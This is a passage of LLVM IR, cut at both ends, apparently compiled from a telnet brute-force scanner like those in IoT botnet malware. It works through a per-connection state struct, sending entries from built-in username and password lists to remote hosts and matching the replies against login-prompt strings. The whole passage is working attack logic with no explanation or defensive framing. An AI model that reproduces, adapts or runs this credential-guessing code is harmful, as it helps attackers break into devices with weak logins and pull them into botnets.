  %773 = load i8, i8* %772, align 2
  %774 = zext i8 %773 to i64
  %775 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %774
  %776 = load i8*, i8** %775, align 8
  %777 = call i64 @strlen(i8* %776) #10
  %778 = call i64 @send(i32 %760, i8* %768, i64 %777, i32 16384)
  %779 = icmp slt i64 %778, 0
  br i1 %779, label %780, label %795

; <label>:780:                                    ; preds = %755
  %781 = load i32, i32* %2, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 0
  %785 = load i32, i32* %784, align 16
  %786 = call i32 @sclose(i32 %785)
  %787 = load i32, i32* %2, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 2
  store i8 0, i8* %790, align 8
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 3
  store i8 1, i8* %794, align 1
  br label %2366

; <label>:795:                                    ; preds = %755
  %796 = load i32, i32* %2, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %797
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %798, i32 0, i32 0
  %800 = load i32, i32* %799, align 16
  %801 = call i64 @send(i32 %800, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %802 = icmp slt i64 %801, 0
  br i1 %802, label %803, label %818

; <label>:803:                                    ; preds = %795
  %804 = load i32, i32* %2, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 0
  %808 = load i32, i32* %807, align 16
  %809 = call i32 @sclose(i32 %808)
  %810 = load i32, i32* %2, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %812, i32 0, i32 2
  store i8 0, i8* %813, align 8
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 3
  store i8 1, i8* %817, align 1
  br label %2366

; <label>:818:                                    ; preds = %795
  %819 = load i32, i32* %2, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 2
  store i8 4, i8* %822, align 8
  br label %2365

; <label>:823:                                    ; preds = %73
  %824 = load i32, i32* %2, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %825
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %826, i32 0, i32 6
  %828 = load i32, i32* %827, align 4
  %829 = icmp eq i32 %828, 0
  br i1 %829, label %830, label %837

; <label>:830:                                    ; preds = %823
  %831 = call i64 @time(i64* null) #2
  %832 = trunc i64 %831 to i32
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 6
  store i32 %832, i32* %836, align 4
  br label %837

; <label>:837:                                    ; preds = %830, %823
  %838 = load i32, i32* %2, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 0
  %842 = load i32, i32* %841, align 16
  %843 = load i32, i32* %2, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 8
  %847 = load i8*, i8** %846, align 8
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 7
  %852 = load i16, i16* %851, align 16
  %853 = zext i16 %852 to i32
  %854 = call i32 @readUntil(i32 %842, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %847, i32 1024, i32 %853)
  %855 = icmp ne i32 %854, 0
  br i1 %855, label %856, label %888

; <label>:856:                                    ; preds = %837
  %857 = load i32, i32* %2, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 6
  store i32 0, i32* %860, align 4
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 7
  store i16 0, i16* %864, align 16
  %865 = load i32, i32* %2, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %866
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %867, i32 0, i32 8
  %869 = load i8*, i8** %868, align 8
  %870 = call i8* @strstr(i8* %869, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0)) #10
  %871 = icmp ne i8* %870, null
  br i1 %871, label %872, label %877

; <label>:872:                                    ; preds = %856
  %873 = load i32, i32* %2, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %874
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %875, i32 0, i32 2
  store i8 5, i8* %876, align 8
  br label %882

; <label>:877:                                    ; preds = %856
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 2
  store i8 7, i8* %881, align 8
  br label %882

; <label>:882:                                    ; preds = %877, %872
  %883 = load i32, i32* %2, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %884
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %885, i32 0, i32 8
  %887 = load i8*, i8** %886, align 8
  call void @llvm.memset.p0i8.i64(i8* %887, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:888:                                    ; preds = %837
  %889 = load i32, i32* %2, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 0
  %893 = load i32, i32* %892, align 16
  %894 = load i32, i32* %2, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 8
  %898 = load i8*, i8** %897, align 8
  %899 = load i32, i32* %2, align 4
  %900 = sext i32 %899 to i64
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %900
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %901, i32 0, i32 7
  %903 = load i16, i16* %902, align 16
  %904 = zext i16 %903 to i32
  %905 = call i32 @readUntil(i32 %893, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %898, i32 1024, i32 %904)
  %906 = icmp ne i32 %905, 0
  br i1 %906, label %907, label %939

; <label>:907:                                    ; preds = %888
  %908 = load i32, i32* %2, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %909
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %910, i32 0, i32 6
  store i32 0, i32* %911, align 4
  %912 = load i32, i32* %2, align 4
  %913 = sext i32 %912 to i64
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %913
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %914, i32 0, i32 7
  store i16 0, i16* %915, align 16
  %916 = load i32, i32* %2, align 4
  %917 = sext i32 %916 to i64
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %917
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %918, i32 0, i32 8
  %920 = load i8*, i8** %919, align 8
  %921 = call i8* @strstr(i8* %920, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %922 = icmp ne i8* %921, null
  br i1 %922, label %923, label %928

; <label>:923:                                    ; preds = %907
  %924 = load i32, i32* %2, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 2
  store i8 5, i8* %927, align 8
  br label %933

; <label>:928:                                    ; preds = %907
  %929 = load i32, i32* %2, align 4
  %930 = sext i32 %929 to i64
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %930
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %931, i32 0, i32 2
  store i8 7, i8* %932, align 8
  br label %933

; <label>:933:                                    ; preds = %928, %923
  %934 = load i32, i32* %2, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 8
  %938 = load i8*, i8** %937, align 8
  call void @llvm.memset.p0i8.i64(i8* %938, i8 0, i64 1024, i32 1, i1 false)
  br label %2366

; <label>:939:                                    ; preds = %888
  %940 = load i32, i32* %2, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %941
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %942, i32 0, i32 8
  %944 = load i8*, i8** %943, align 8
  %945 = call i8* @strstr(i8* %944, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %946 = icmp ne i8* %945, null
  br i1 %946, label %947, label %962

; <label>:947:                                    ; preds = %939
  %948 = load i32, i32* %2, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 0
  %952 = load i32, i32* %951, align 16
  %953 = call i32 @sclose(i32 %952)
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 2
  store i8 0, i8* %957, align 8
  %958 = load i32, i32* %2, align 4
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 3
  store i8 0, i8* %961, align 1
  br label %2366

; <label>:962:                                    ; preds = %939
  %963 = load i32, i32* %2, align 4
  %964 = sext i32 %963 to i64
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %964
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %965, i32 0, i32 8
  %967 = load i8*, i8** %966, align 8
  %968 = call i8* @strstr(i8* %967, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %969 = icmp ne i8* %968, null
  br i1 %969, label %970, label %985

; <label>:970:                                    ; preds = %962
  %971 = load i32, i32* %2, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 0
  %975 = load i32, i32* %974, align 16
  %976 = call i32 @sclose(i32 %975)
  %977 = load i32, i32* %2, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 2
  store i8 0, i8* %980, align 8
  %981 = load i32, i32* %2, align 4
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %982
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %983, i32 0, i32 3
  store i8 0, i8* %984, align 1
  br label %2366

; <label>:985:                                    ; preds = %962
  %986 = load i32, i32* %2, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %987
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %988, i32 0, i32 8
  %990 = load i8*, i8** %989, align 8
  %991 = call i8* @strstr(i8* %990, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %992 = icmp ne i8* %991, null
  br i1 %992, label %993, label %1008

; <label>:993:                                    ; preds = %985
  %994 = load i32, i32* %2, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 0
  %998 = load i32, i32* %997, align 16
  %999 = call i32 @sclose(i32 %998)
  %1000 = load i32, i32* %2, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 2
  store i8 0, i8* %1003, align 8
  %1004 = load i32, i32* %2, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 3
  store i8 0, i8* %1007, align 1
  br label %2366

; <label>:1008:                                   ; preds = %985
  %1009 = load i32, i32* %2, align 4
  %1010 = sext i32 %1009 to i64
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1010
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1011, i32 0, i32 8
  %1013 = load i8*, i8** %1012, align 8
  %1014 = call i8* @strstr(i8* %1013, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1015 = icmp ne i8* %1014, null
  br i1 %1015, label %1016, label %1031

; <label>:1016:                                   ; preds = %1008
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 0
  %1021 = load i32, i32* %1020, align 16
  %1022 = call i32 @sclose(i32 %1021)
  %1023 = load i32, i32* %2, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1024
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1025, i32 0, i32 2
  store i8 0, i8* %1026, align 8
  %1027 = load i32, i32* %2, align 4
  %1028 = sext i32 %1027 to i64
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1028
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1029, i32 0, i32 3
  store i8 0, i8* %1030, align 1
  br label %2366

; <label>:1031:                                   ; preds = %1008
  %1032 = load i32, i32* %2, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 8
  %1036 = load i8*, i8** %1035, align 8
  %1037 = call i8* @strstr(i8* %1036, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1038 = icmp ne i8* %1037, null
  br i1 %1038, label %1039, label %1054

; <label>:1039:                                   ; preds = %1031
  %1040 = load i32, i32* %2, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 0
  %1044 = load i32, i32* %1043, align 16
  %1045 = call i32 @sclose(i32 %1044)
  %1046 = load i32, i32* %2, align 4
  %1047 = sext i32 %1046 to i64
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1047
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1048, i32 0, i32 2
  store i8 0, i8* %1049, align 8
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 3
  store i8 0, i8* %1053, align 1
  br label %2366

; <label>:1054:                                   ; preds = %1031
  %1055 = load i32, i32* %2, align 4
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 8
  %1059 = load i8*, i8** %1058, align 8
  %1060 = call i8* @strstr(i8* %1059, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1061 = icmp ne i8* %1060, null
  br i1 %1061, label %1062, label %1077

; <label>:1062:                                   ; preds = %1054
  %1063 = load i32, i32* %2, align 4
  %1064 = sext i32 %1063 to i64
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1064
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1065, i32 0, i32 0
  %1067 = load i32, i32* %1066, align 16
  %1068 = call i32 @sclose(i32 %1067)
  %1069 = load i32, i32* %2, align 4
  %1070 = sext i32 %1069 to i64
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 2
  store i8 0, i8* %1072, align 8
  %1073 = load i32, i32* %2, align 4
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1074
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1075, i32 0, i32 3
  store i8 0, i8* %1076, align 1
  br label %2366

; <label>:1077:                                   ; preds = %1054
  %1078 = load i32, i32* %2, align 4
  %1079 = sext i32 %1078 to i64
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1079
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1080, i32 0, i32 8
  %1082 = load i8*, i8** %1081, align 8
  %1083 = call i8* @strstr(i8* %1082, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1084 = icmp ne i8* %1083, null
  br i1 %1084, label %1085, label %1100

; <label>:1085:                                   ; preds = %1077
  %1086 = load i32, i32* %2, align 4
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 0
  %1090 = load i32, i32* %1089, align 16
  %1091 = call i32 @sclose(i32 %1090)
  %1092 = load i32, i32* %2, align 4
  %1093 = sext i32 %1092 to i64
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1093
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1094, i32 0, i32 2
  store i8 0, i8* %1095, align 8
  %1096 = load i32, i32* %2, align 4
  %1097 = sext i32 %1096 to i64
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1097
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1098, i32 0, i32 3
  store i8 0, i8* %1099, align 1
  br label %2366

; <label>:1100:                                   ; preds = %1077
  %1101 = load i32, i32* %2, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1102
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1103, i32 0, i32 8
  %1105 = load i8*, i8** %1104, align 8
  %1106 = call i8* @strstr(i8* %1105, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1107 = icmp ne i8* %1106, null
  br i1 %1107, label %1108, label %1123

; <label>:1108:                                   ; preds = %1100
  %1109 = load i32, i32* %2, align 4
  %1110 = sext i32 %1109 to i64
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1110
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1111, i32 0, i32 0
  %1113 = load i32, i32* %1112, align 16
  %1114 = call i32 @sclose(i32 %1113)
  %1115 = load i32, i32* %2, align 4
  %1116 = sext i32 %1115 to i64
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1116
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1117, i32 0, i32 2
  store i8 0, i8* %1118, align 8
  %1119 = load i32, i32* %2, align 4
  %1120 = sext i32 %1119 to i64
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1120
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1121, i32 0, i32 3
  store i8 0, i8* %1122, align 1
  br label %2366

; <label>:1123:                                   ; preds = %1100
  %1124 = load i32, i32* %2, align 4
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1125
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1126, i32 0, i32 8
  %1128 = load i8*, i8** %1127, align 8
  %1129 = call i8* @strstr(i8* %1128, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1130 = icmp ne i8* %1129, null
  br i1 %1130, label %1131, label %1146

; <label>:1131:                                   ; preds = %1123
  %1132 = load i32, i32* %2, align 4
  %1133 = sext i32 %1132 to i64
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1133
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1134, i32 0, i32 0
  %1136 = load i32, i32* %1135, align 16
  %1137 = call i32 @sclose(i32 %1136)
  %1138 = load i32, i32* %2, align 4
  %1139 = sext i32 %1138 to i64
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1139
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1140, i32 0, i32 2
  store i8 0, i8* %1141, align 8
  %1142 = load i32, i32* %2, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1143
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1144, i32 0, i32 3
  store i8 0, i8* %1145, align 1
  br label %2366

; <label>:1146:                                   ; preds = %1123
  %1147 = load i32, i32* %2, align 4
  %1148 = sext i32 %1147 to i64
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1148
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1149, i32 0, i32 8
  %1151 = load i8*, i8** %1150, align 8
  %1152 = call i64 @strlen(i8* %1151) #10
  %1153 = trunc i64 %1152 to i16
  %1154 = load i32, i32* %2, align 4
  %1155 = sext i32 %1154 to i64
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1155
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1156, i32 0, i32 7
  store i16 %1153, i16* %1157, align 16
  br label %1158

; <label>:1158:                                   ; preds = %1146
  %1159 = load i32, i32* %2, align 4
  %1160 = sext i32 %1159 to i64
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1160
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1161, i32 0, i32 6
  %1163 = load i32, i32* %1162, align 4
  %1164 = add i32 %1163, -1113173491
  %1165 = add i32 %1164, 10
  %1166 = sub i32 %1165, -1113173491
  %1167 = add i32 %1163, 10
  %1168 = zext i32 %1166 to i64
  %1169 = call i64 @time(i64* null) #2
  %1170 = icmp slt i64 %1168, %1169
  br i1 %1170, label %1171, label %1186

; <label>:1171:                                   ; preds = %1158
  %1172 = load i32, i32* %2, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1173
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1174, i32 0, i32 0
  %1176 = load i32, i32* %1175, align 16
  %1177 = call i32 @sclose(i32 %1176)
  %1178 = load i32, i32* %2, align 4
  %1179 = sext i32 %1178 to i64
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1179
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1180, i32 0, i32 2
  store i8 0, i8* %1181, align 8
  %1182 = load i32, i32* %2, align 4
  %1183 = sext i32 %1182 to i64
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1183
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1184, i32 0, i32 3
  store i8 1, i8* %1185, align 1
  br label %1186

; <label>:1186:                                   ; preds = %1171, %1158
  br label %2365

; <label>:1187:                                   ; preds = %73
  %1188 = load i32, i32* %2, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 0
  %1192 = load i32, i32* %1191, align 16
  %1193 = load i32, i32* %2, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 5
  %1197 = load i8, i8* %1196, align 1
  %1198 = zext i8 %1197 to i64
  %1199 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1198
  %1200 = load i8*, i8** %1199, align 8
  %1201 = load i32, i32* %2, align 4
  %1202 = sext i32 %1201 to i64
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1202
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1203, i32 0, i32 5
  %1205 = load i8, i8* %1204, align 1
  %1206 = zext i8 %1205 to i64
  %1207 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1206
  %1208 = load i8*, i8** %1207, align 8
  %1209 = call i64 @strlen(i8* %1208) #10
  %1210 = call i64 @send(i32 %1192, i8* %1200, i64 %1209, i32 16384)
  %1211 = icmp slt i64 %1210, 0
  br i1 %1211, label %1212, label %1227

; <label>:1212:                                   ; preds = %1187
  %1213 = load i32, i32* %2, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 0
  %1217 = load i32, i32* %1216, align 16
  %1218 = call i32 @sclose(i32 %1217)
  %1219 = load i32, i32* %2, align 4
  %1220 = sext i32 %1219 to i64
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1220
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1221, i32 0, i32 2
  store i8 0, i8* %1222, align 8
  %1223 = load i32, i32* %2, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1224
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1225, i32 0, i32 3
  store i8 1, i8* %1226, align 1
  br label %2366

; <label>:1227:                                   ; preds = %1187
  %1228 = load i32, i32* %2, align 4
  %1229 = sext i32 %1228 to i64
